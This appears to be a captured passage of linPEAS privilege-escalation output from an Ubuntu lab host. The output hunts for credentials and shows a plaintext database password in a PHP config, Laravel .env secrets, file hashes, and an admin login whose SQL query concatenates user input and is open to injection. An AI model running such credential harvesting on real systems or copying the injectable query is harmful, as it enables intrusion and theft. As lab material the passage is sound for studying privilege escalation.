+/var/log/dpkg.log:2017-02-15 20:19:56 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2017-02-15 20:19:56 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2017-02-15 20:19:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2017-02-15 20:20:12 configure base-passwd:amd64 3.5.39 <none>
+/var/log/dpkg.log:2017-02-15 20:20:12 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:20:12 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:20:13 status installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:20:26 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
+/var/log/dpkg.log:2017-02-15 20:20:26 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2017-02-15 20:20:26 status installed passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2017-02-15 20:20:26 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/installer/status:Description: Set up users and passwords
+
+[+] Finding emails inside logs (limit 70)
+     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
+     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com
+     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
+      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+/home/noulis/.composer/cache/repo/https---packagist.org/provider-ircmaxell$password-compat.json
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/linpeas.sh:    P)  PASSWORD=$OPTARG;;
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -E "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh:  PASSWORDTRY=$2
+/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+/tmp/linpeas.sh:PASSWORD=""
+/tmp/linpeas.sh:processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"
+/var/backups/dpkg.status.0:Depends: adduser, passwd, init-system-helpers (>= 1.18~), libc6 (>= 2.14), libsystemd0
+/var/backups/dpkg.status.0:Depends: base-passwd (>= 3.0.4)
+/var/backups/dpkg.status.0:Depends: passwd, libc6 (>= 2.4)
+/var/backups/dpkg.status.0:Depends: perl-base (>= 5.6.0), passwd (>= 1:4.1.5.1-1.1ubuntu6), debconf | debconf-2.0
+/var/www/admin/config.php:   define('DB_DATABASE', 'admin');
+/var/www/admin/config.php:   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+/var/www/admin/config.php:   define('DB_USERNAME', 'admin');
+/var/www/admin/index.php:                  <label>Password  :</label><input type = "password" name = "password" class = "box" /><br/><br />
+/var/www/admin/index.php:      $mypassword = md5($_POST['password']); 
+/var/www/admin/index.php:      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
+/var/www/laravel/.env:DB_PASSWORD=secret
+/var/www/laravel/.env:MAIL_PASSWORD=null
+/var/www/laravel/.env:REDIS_PASSWORD=null
+/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php:            'password' => 'required|string|min:6|confirmed',
+/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php:            'password' => bcrypt($data['password']),
+/var/www/laravel/bootstrap/cache/services.php:    'Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider' => 
+/var/www/laravel/bootstrap/cache/services.php:    'auth.password' => 'Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider',
+/var/www/laravel/bootstrap/cache/services.php:    'auth.password.broker' => 'Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider',
+/var/www/laravel/config/app.php:        'Password' => Illuminate\Support\Facades\Password::class,
+/var/www/laravel/config/app.php:        Illuminate\Auth\Passwords\PasswordResetServiceProvider::class,
+/var/www/laravel/config/auth.php:        'passwords' => 'users',
+/var/www/laravel/config/auth.php:    'passwords' => [
+/var/www/laravel/config/database.php:            'password' => env('DB_PASSWORD', ''),
+/var/www/laravel/config/database.php:            'password' => env('REDIS_PASSWORD', null),
+/var/www/laravel/config/mail.php:    'password' => env('MAIL_PASSWORD'),
+/var/www/laravel/database/factories/ModelFactory.php:        'password' => $password ?: $password = bcrypt('secret'),
+/var/www/laravel/resources/lang/en/passwords.php:    'password' => 'Passwords must be at least six characters and match the confirmation.',
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Generator.php: * @method string password($minLength = 6, $maxLength = 20)
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    public function password($minLength = 6, $maxLength = 20)
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Auth/Passwords/PasswordBroker.php:            ) && $password === $confirm;
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Auth/Passwords/PasswordBroker.php:            list($password, $confirm) = [
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Auth/Passwords/PasswordBroker.php:        $password = $credentials['password'];
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Auth/Passwords/PasswordBroker.php:        $this->passwordValidator = $callback;
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Auth/Passwords/PasswordBroker.php:        list($password, $confirm) = [
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php:        list($username, $password) = $credentials;
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Contracts/Auth/PasswordBroker.php:    const INVALID_PASSWORD = 'passwords.password';
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Contracts/Auth/PasswordBroker.php:    const PASSWORD_RESET = 'passwords.reset';
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        list($username, $password) = [
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md:    'password'  => 'password',
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ResetsPasswords.php:            'password' => 'required|confirmed|min:6',
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ResetsPasswords.php:            'password' => bcrypt($password),
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ResetsPasswords.php:        return $response == Password::PASSWORD_RESET
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ResetsPasswords.php:        return Password::broker();
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/SendsPasswordResetEmails.php:        return Password::broker();
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Support/Facades/Password.php:    const INVALID_PASSWORD = 'passwords.password';
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Support/Facades/Password.php:    const PASSWORD_RESET = 'passwords.reset';
+/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php:            'password' => null,
+/var/www/laravel/vendor/psy/psysh/test/Psy/Test/ConfigurationTest.php:        $oldPwd = getenv('PWD');
+/var/www/laravel/vendor/psy/psysh/test/Psy/Test/ConfigurationTest.php:        putenv("PWD=$oldPwd");
+/var/www/laravel/vendor/psy/psysh/test/Psy/Test/ConfigurationTest.php:        putenv('PWD=' . realpath(__DIR__ . '/../../fixtures/project/'));
+/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{password}'=>$row['password']
+/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{password}'=>$user['password']
+/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php:        $this->_password = $password;
+/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/Auth/NTLMAuthenticator.php:        if (strlen($password) <= 15) {
+/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php:        $this->_password = $password;
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/smoke.conf.php.default:define('SWIFT_SMOKE_SMTP_USER', '');
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'SecREt01';
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'test1234';
+/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:    private $password = '';
+/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $password = $request->getPassword();
+/var/www/laravel/vendor/symfony/http-kernel/DataCollector/RequestDataCollector.php:            $this->data['request_request']['_password'] = '******';
+
+[+] Finding possible password variables inside key folders (limit 70)
+/var/www/laravel/.env:APP_NAME=Laravel
+/var/www/laravel/.env:DB_CONNECTION=mysql
+/var/www/laravel/.env:DB_DATABASE=homestead
+/var/www/laravel/.env:DB_HOST=127.0.0.1
+/var/www/laravel/.env:DB_PORT=3306
+/var/www/laravel/.env:DB_USERNAME=homestead
+/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php:        $this->secretKey = $secretKey;
+/var/www/laravel/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:            'app_name' => $this->name,
+
+[+] Finding possible password in config files
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+ /etc/init/passwd.conf
+passwd - clear locks on passwd and related files
+passwd to avoid million duplicate bug reports
+passwd locks"
+passwd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock
+ /etc/nsswitch.conf
+passwd:         compat
+ /etc/adduser.conf
+passwd
+ /etc/apache2/apache2.conf
+passwd files from being
+ /etc/sysctl.d/10-ptrace.conf
+credentials that exist in memory (re-using existing SSH connections,
+
+[+] Finding 'username' string inside key folders (limit 70)
+/var/www/admin/index.php:                  <label>UserName  :</label><input type = "text" name = "username" class = "box"/><br /><br />
+/var/www/admin/index.php:      $myusername = $_POST['username'];
+/var/www/admin/index.php:      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
+/var/www/admin/session.php:   $ses_sql = mysqli_query($db,"select username from admin where username = '$user_check' ");
+/var/www/laravel/.env:DB_USERNAME=homestead
+/var/www/laravel/.env:MAIL_USERNAME=null
+/var/www/laravel/config/database.php:            'username' => env('DB_USERNAME', 'forge'),
+/var/www/laravel/config/mail.php:    'username' => env('MAIL_USERNAME'),
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = static::bothify($this->generator->parse($format));
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php:    protected static $userNameFormats = array(
+/var/www/laravel/vendor/fzaninotto/faker/test/Faker/Provider/InternetTest.php:        $username = $this->faker->username();
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php:        list($username, $password) = $credentials;
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        list($username, $password) = [
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ThrottlesLogins.php:        $errors = [$this->username() => $message];
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:        $this->username = $username;
+/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:    public function from($username, $icon = null)
+/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        $username = $this->safeStorage->retrieveSafely('username');
+/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        return $username !== null ? $username : 'anonymous';
+/var/www/laravel/vendor/league/flysystem/src/Adapter/Ftp.php:                ) . ', username: ' . $this->getUsername()
+/var/www/laravel/vendor/monolog/monolog/doc/01-usage.md:$logger->addInfo('Adding a new user', array('username' => 'Seldaek'));
+/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php:            'username' => null,
+/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:            $dataArray['username'] = $this->username;
+/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:        $this->username = $username;
+/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Slack/SlackRecordTest.php:        $username = 'Monolog bot';
+/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackHandlerTest.php:        $this->assertRegExp('/username=Monolog/', $content);
+/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackWebhookHandlerTest.php:            'username' => 'test-username',
+/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array(
+/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array($methodProphecy)
+/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'isUsername' => array(
+/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$row['username'],
+/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$user['username'],
+/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php:        $this->_username = $username;
+/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php:        $this->_username = $username;
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "DOMAIN\user";
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "domain.com\user";
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'test';
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user';
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@DOMAIN';
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@domain.com';
+/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:    private $username = '';
+/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $request = Request::create('http://username:password@test.com');
+/var/www/laravel/vendor/symfony/http-foundation/Tests/ServerBagTest.php:            'AUTHORIZATION' => 'Basic '.base64_encode('username:pass:word'),
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
+/etc/machine-id:11d6455b090fd0fdc73300a358d2be77
+/etc/popularity-contest.conf:"b2fec067249649b0890ca1b05a047580"
+/var/backups/dpkg.status.0: 87fc76f18e98ee7d3848f6b81b3391e5
+
+[+] Finding URIs with user:password@host inside key folders
+/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $request = Request::create('http://user_test:password_test@test.com/');
+/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $request = Request::create('http://username:password@test.com');
